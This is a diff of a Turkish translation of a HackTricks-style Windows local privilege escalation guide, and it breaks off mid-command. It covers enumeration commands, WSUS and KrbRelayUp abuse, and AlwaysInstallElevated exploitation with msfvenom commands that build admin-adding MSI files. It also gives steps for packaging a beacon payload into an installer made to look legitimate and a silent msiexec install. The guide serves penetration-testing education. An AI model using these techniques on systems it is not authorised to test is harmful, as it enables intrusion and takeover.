@@ -1,14 +1,14 @@
-# Windows Yerel Ayrıcalık Yükseltme
+# Windows Local Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-## Windows Temelleri
+## İlk Windows Teorisi
 
 ### Access Tokens
 
-**Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**
+**Eğer Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**
 
 
 {{#ref}}
@@ -26,7 +26,7 @@ acls-dacls-sacls-aces.md
 
 ### Integrity Levels
 
-**Windows'taki integrity levels'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**
+**Windows'taki integrity levels'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalisiniz:**
 
 
 {{#ref}}
@@ -35,18 +35,18 @@ integrity-levels.md
 
 ## Windows Güvenlik Kontrolleri
 
-Windows'ta sistemin keşfini engelleyebilecek, çalıştırılabilir dosyaların çalışmasını önleyebilecek veya faaliyetlerinizi tespit edebilecek çeşitli mekanizmalar vardır. Privilege escalation enumerasyonuna başlamadan önce aşağıdaki sayfayı okuyup bu tüm savunma mekanizmalarını enumerate etmelisiniz:
+Windows'ta sistemin taranmasını engelleyebilecek, yürütülebilir dosyaları çalıştırmanızı önleyebilecek veya hatta aktivitelerinizi tespit edebilecek çeşitli öğeler vardır. Privilege escalation enumerasyonuna başlamadan önce aşağıdaki sayfayı okumalı ve tüm bu savunma mekanizmalarını listelemelisiniz:
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
-## Sistem Bilgileri
+## Sistem Bilgisi
 
-### Sürüm bilgisi keşfi
+### Sürüm bilgisi enumerasyonu
 
-Windows sürümünün bilinen bir zafiyeti olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
+Windows sürümünün bilinen herhangi bir açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -59,23 +59,23 @@ wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architec
 Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
-### Sürüm Exploits
+### Version Exploits
 
-Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor; bu, bir Windows ortamının **büyük saldırı yüzeyini** gösteriyor.
+Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlı. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor; Windows ortamının sunduğu **massive attack surface**'ı gösteriyor.
 
 **Sistemde**
 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içinde barındırır)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü)_
 
-**Sistem bilgileriyle yerel olarak**
+**Yerelde sistem bilgileri ile**
 
 - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 - [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**GitHub depoları (exploits):**
+**Github repos of exploits:**
 
 - [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 - [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
@@ -83,7 +83,7 @@ Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güv
 
 ### Ortam
 
-Herhangi bir credential/Juicy bilgi env variables içinde kayıtlı mı?
+Herhangi bir kimlik bilgisi/değerli bilgi env değişkenlerinde kayıtlı mı?
 ```bash
 set
 dir env:
@@ -99,7 +99,7 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
-### PowerShell Transcript files
+### PowerShell Transcript dosyaları
 
 Bunu nasıl etkinleştireceğinizi şu adresten öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
 ```bash
@@ -116,9 +116,9 @@ Stop-Transcript
 ```
 ### PowerShell Module Logging
 
-PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahil edilir. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.
+PowerShell pipeline yürütmeleriyle ilgili ayrıntılar kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçalarını kapsar. Ancak tüm yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.
 
-Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
+Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin; **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
@@ -131,14 +131,14 @@ Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-Betik çalıştırılmasının tüm etkinlikleri ve tam içerik kaydı yakalanır; böylece her kod bloğu çalıştığı anda belgelenmiş olur. Bu süreç, adli inceleme ve kötü amaçlı davranışların analizinde değerli olan her etkinliğin kapsamlı bir denetim izleğini korur. Tüm etkinlikleri çalıştırma zamanında belgelendirerek, işleme ilişkin ayrıntılı içgörüler sağlar.
+Betiğin yürütülmesinin tam etkinlik ve içerik kaydı tutulur; böylece her kod bloğu çalışırken belgelenir. Bu süreç, adli inceleme ve kötü amaçlı davranışların analizinde değerli olan kapsamlı bir denetim izini korur. Yürütme anında tüm etkinlikler belgelenerek sürece ilişkin ayrıntılı içgörüler sağlanır.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Script Block'a ait kayıt olayları Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
+Script Block için olay kayıtları Windows Event Viewer'da şu yolda bulunur: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
 Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
@@ -156,9 +156,9 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 ## WSUS
 
-Güncellemeler http**S** yerine http üzerinden talep ediliyorsa sistemi ele geçirebilirsiniz.
+Güncellemeler http**S** yerine http ile talep ediliyorsa sistemi ele geçirebilirsiniz.
 
-İlk olarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakileri çalıştırın:
+Başlangıç olarak, ağın non-SSL WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
@@ -166,7 +166,7 @@ Veya PowerShell'de aşağıdakiler:
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
-Aşağıdakilerden biri gibi bir yanıt alırsanız:
+Bunlardan biri gibi bir yanıt alırsanız:
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
@@ -182,11 +182,11 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
 Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.
 
-O zaman, **sömürülebilir.** Son kayıt değeri `0` ise, WSUS girişi göz ardı edilecektir.
+O zaman, **istismar edilebilir.** Eğer son kayıt değeri `0` ise, WSUS girdisi yok sayılacaktır.
 
-Bu zafiyetleri sömürmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar, SSL olmayan WSUS trafiğine 'sahte' güncellemeler enjekte etmek için MiTM amaçlı silahlandırılmış exploit script'leridir.
+Bu zafiyeti istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar MiTM amaçlı, non-SSL WSUS trafiğine 'sahte' güncellemeler enjekte eden exploit scriptleridir.
 
-Read the research here:
+Araştırmayı burada okuyun:
 
 {{#file}}
 CTX_WSUSpect_White_Paper (1).pdf
@@ -194,18 +194,18 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 **WSUS CVE-2020-1013**
 
-[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
+[**Tam raporu burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
 Temelde, bu hatanın istismar ettiği kusur şudur:
 
-> Eğer yerel kullanıcı proxy'sini değiştirme yetkimiz varsa ve Windows Updates Internet Explorer’ın ayarlarında yapılandırılmış proxy'yi kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
+> Eğer yerel kullanıcı proxy’imizi değiştirme yetkimiz varsa ve Windows Update, Internet Explorer’ın ayarlarında yapılandırılmış proxy’yi kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)’u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
 >
-> Ayrıca, WSUS servisi mevcut kullanıcının ayarlarını kullandığı için sertifika deposunu da kullanır. Eğer WSUS hostname'i için kendinden imzalı bir sertifika oluşturur ve bu sertifikayı mevcut kullanıcının sertifika deposuna eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabilirsiniz. WSUS, sertifikada trust-on-first-use tipi bir doğrulamayı uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güveniliyorsa ve doğru hostname'e sahipse, servis tarafından kabul edilecektir.
+> Dahası, WSUS servisi geçerli kullanıcının ayarlarını kullandığı için onun sertifika deposunu da kullanır. WSUS hostname’i için self-signed bir sertifika üretip bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde trust-on-first-use benzeri bir doğrulama uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ise ve doğru hostname’e sahipse, servis tarafından kabul edilir.
 
-Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla sömürebilirsiniz (kullanıma sunulduğunda).
+Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (serbest kaldığında) istismar edebilirsiniz.
 
-## Third-Party Auto-Updaters and Agent IPC (local privesc)
+## Üçüncü Taraf Otomatik Güncelleyiciler ve Ajan IPC (local privesc)
 
-Pek çok kurumsal ajan localhost üzerinden bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment bir saldırgan sunucusuna zorlanabilirse ve updater sahte bir root CA'ya veya zayıf imzacı kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak zararlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayanan – CVE-2025-0309) için bkz:
+Birçok kurumsal ajan, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı açar. Kayıt bir saldırgan sunucusuna zorlanabiliyor ve updater sahte bir root CA’ya veya zayıf imzalayıcı kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisine yüklenen zararlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bakınız:
 
 {{#ref}}
 abusing-auto-updaters-and-ipc.md
@@ -213,15 +213,15 @@ abusing-auto-updaters-and-ipc.md
 
 ## KrbRelayUp
 
-Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing'in uygulanmadığı** ortamları, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasını değiştirebilme yetkisine sahip olmalarını ve kullanıcıların domain içinde bilgisayar (computer) oluşturabilme kabiliyetini içerir. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını not etmek önemlidir.
+Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing zorunlu değilse**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırma hakkına sahip olmaları ve kullanıcıların domain içinde bilgisayar oluşturabilme yeteneğini içermektedir. Bu **gereksinimlerin** varsayılan ayarlarla sağlandığını unutmamak önemlidir.
 
-Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+Exploit'i şurada bulun: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
+Saldırının akışı hakkında daha fazla bilgi için bkz. https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
 
 ## AlwaysInstallElevated
 
-**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
+**Eğer** bu 2 kayıt **etkinse** (değer **0x1** ise), o zaman her seviyeden kullanıcı `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -231,19 +231,19 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
-Eğer bir meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülü ile otomatikleştirebilirsiniz.
+If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
 
 ### PowerUP
 
-PowerUP içindeki `Write-UserAddMSI` komutunu kullanarak mevcut dizinde ayrıcalık yükseltmek için bir Windows MSI ikili dosyası oluşturun. Bu betik, bir kullanıcı/grup eklemesi isteyen önceden derlenmiş bir MSI yükleyicisi yazar (bu yüzden GUI erişimine ihtiyacınız olacak):
+Geçerli dizinde ayrıcalıkları yükseltmek için bir Windows MSI binary oluşturmak üzere power-up içinden `Write-UserAddMSI` komutunu kullanın. Bu script, user/group addition için prompt veren ön-derlenmiş bir MSI installer yazar (bu yüzden GIU access gerekecektir):
 ```
 Write-UserAddMSI
 ```
-Just execute the created binary to escalate privileges.
+Yetkileri yükseltmek için oluşturulan ikiliyi çalıştırmanız yeterlidir.
 
 ### MSI Wrapper
 
-Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**
+Bu öğreticiyi, bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için okuyun. Sadece komut satırlarını çalıştırmak istiyorsanız bir "**.bat**" dosyasını sarmalayabileceğinizi unutmayın.
 
 
 {{#ref}}
@@ -259,45 +259,44 @@ create-msi-with-wix.md
 
 ### Create MSI with Visual Studio
 
-- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
-- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
-- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
-- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
-- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
-- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
-- Right-click the project and select **View > Custom Actions**.
-- Right-click **Install** and select **Add Custom Action**.
-- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
-- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
-- Finally, **build it**.
-- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.
+- **Cobalt Strike** veya **Metasploit** ile `C:\privesc\beacon.exe` konumunda yeni bir **Windows EXE TCP payload** oluşturun
+- **Visual Studio**'yu açın, **Create a new project**'ı seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
+- Projeye **AlwaysPrivesc** gibi bir isim verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'a tıklayın.
+- Dahil edilecek dosyaları seçme adımı olan 4 adımın 3. adımına gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
+- **Solution Explorer** içinde **AlwaysPrivesc** projesini seçin ve **Properties**'de **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
+- Yüklü uygulamayı daha meşru gösterebilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz diğer özellikler de vardır.
+- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
+- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
+- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, kurucu çalıştırıldığında beacon payload'unun hemen yürütülmesini sağlar.
+- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
+- Son olarak, **derleyin**.
+- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.
 
 ### MSI Installation
 
-Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:
+Kötü amaçlı `.msi` dosyasının arka planda **kurulumunu** yürütmek için:
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
-Bu zafiyeti istismar etmek için kullanabileceğiniz: _exploit/windows/local/always_install_elevated_
+Bu güvenlik açığını istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_
 
-## Antivirüs ve Dedektörler
+## Antivirus ve Tespit Araçları
 
 ### Denetim Ayarları
 
-Bu ayarlar hangi bilgilerin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz
+Bu ayarlar hangi bilgilerin **kaydedileceğine** karar verir, bu yüzden dikkat etmelisiniz.
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 ### WEF
 
-Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek ilginçtir
+Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 ### LAPS
 
-**LAPS** etki alanına katılmış bilgisayarlarda yerel Administrator parolalarının yönetimi için tasarlanmıştır; her parolanın benzersiz, rastgele ve düzenli olarak güncellenmesini sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izinlere sahip kullanıcılar tarafından erişilebilir; bu kullanıcılar yetkilendirilmişse yerel Administrator parolalarını görüntüleyebilir.
-
+**LAPS** domain'e katılmış bilgisayarlarda yerel Administrator parolalarının yönetimi için tasarlanmıştır; her parolanın benzersiz, rastgele ve düzenli olarak güncellendiğinden emin olur. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izinlere sahip kullanıcılara erişim verilir; yetkilendirilmiş kullanıcılar yerel admin parolalarını görüntüleyebilir.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -305,34 +304,34 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-Eğer etkinse, **düz metin parolalar LSASS'te saklanır** (Local Security Authority Subsystem Service).\
-[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
+Eğer etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
+[**WDigest hakkında daha fazla bilgi için bu sayfaya bakın**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
 ### LSA Protection
 
-**Windows 8.1**'den itibaren, Microsoft, Local Security Authority (LSA) için güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla geliştirilmiş bir koruma getirerek sistemi daha da güvenli hale getirdi.\
-[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
+**Windows 8.1**'den itibaren, Microsoft, Local Security Authority (LSA) için güvensiz süreçlerin **belleğini okumaya** veya kod enjekte etmeye yönelik girişimlerini **engellemek** amacıyla gelişmiş bir koruma sundu ve böylece sistemi daha da güvenli hale getirdi.\
+[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard**, **Windows 10**'da tanıtıldı. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** Windows 10'da tanıtıldı. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
-### Önbelleğe Alınmış Kimlik Bilgileri
+### Cached Credentials
 
-**Domain kimlik bilgileri** **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için domain kimlik bilgileri genellikle oluşturulur.\
+**Domain credentials**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının logon verileri kayıtlı bir security package tarafından doğrulandığında, o kullanıcı için domain credentials genellikle oluşturulur.\
 [**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## Kullanıcılar ve Gruplar
+## Kullanıcılar ve Gruuplar
 
-### Kullanıcıları ve Grupları Listeleme
+### Kullanıcılar ve Grupları Listeleme
 
 Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
 ```bash
@@ -351,29 +350,29 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 ### Ayrıcalıklı gruplar
 
-Eğer **bazı ayrıcalıklı gruplardan birine üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı grupları ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanacağınızı burada öğrenin:
+Eğer bir **ayrıcalıklı gruba aitseniz, ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanabileceğinizi öğrenin:
 
 
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
 
-### Token manipulation
+### Token manipülasyonu
 
-**Daha fazla bilgi edinin** bu sayfada bir **token**'ın ne olduğunu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
-Aşağıdaki sayfayı **ilginç token'lar hakkında bilgi edinmek** ve bunları nasıl kötüye kullanacağınızı öğrenmek için kontrol edin:
+**Daha fazla bilgi edinin** bir **token**'in ne olduğunu bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
+Aşağıdaki sayfayı kontrol ederek **ilginç token'lar hakkında bilgi edinin** ve bunları nasıl kötüye kullanabileceğinizi öğrenin:
 
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Oturum açmış kullanıcılar / Oturumlar
+### Giriş yapmış kullanıcılar / Oturumlar
 ```bash
 qwinsta
 klist sessions
 ```
-### Ev klasörleri
+### Kullanıcı dizinleri
 ```bash
 dir C:\Users
 Get-ChildItem C:\Users
@@ -386,12 +385,12 @@ net accounts
 ```bash
 powershell -command "Get-Clipboard"
 ```
-## Çalışan İşlemler
+## Çalışan Süreçler
 
 ### Dosya ve Klasör İzinleri
 
-Öncelikle, prosesleri listeleyerek **işlemin komut satırında şifreler olup olmadığını kontrol edin**.\
-Çalışan bir **binary'i üzerine yazıp yazamayacağınızı** veya binary klasöründe yazma izniniz olup olmadığını kontrol edin, olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar etmek için:
+Öncelikle süreçleri listeleyip sürecin komut satırında parola/parolalar olup olmadığını **kontrol edin**.\
+Çalışan bazı binary'leri **overwrite edip edemeyeceğinizi** veya binary klasöründe yazma izninizin olup olmadığını kontrol edin; olası [**DLL Hijacking attacks**](dll-hijacking/index.html) için:
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -402,9 +401,9 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Her zaman olası [**electron/cef/chromium debuggers** çalışıyor olabilir, bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Her zaman olası [**electron/cef/chromium debuggers** çalışıyor olabilir, bunu ayrıcalık yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
-**Süreçlerin ikili (binary) dosyalarının izinlerini kontrol etme**
+**Süreçlerin binary dosyalarının izinlerini kontrol etme**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
 for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
@@ -413,7 +412,7 @@ icacls "%%z"
 )
 )
 ```
-**processes binaries klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
+**Proses binary'lerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
